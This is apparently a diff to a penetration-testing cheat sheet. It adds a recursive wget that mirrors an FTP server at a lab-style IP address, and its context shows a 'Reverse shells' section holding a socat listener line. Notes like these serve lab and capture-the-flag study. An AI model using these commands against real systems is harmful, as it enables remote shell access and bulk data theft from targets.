@@ -10,6 +10,10 @@
 
 # Linux
 
+## FTP download files 
+
+`wget -r --no-passive ftp://10.10.10.106`
+
 ## Reverse shells
 
 * socat file:\`tty\`,echo=0,raw udp-listen:4444
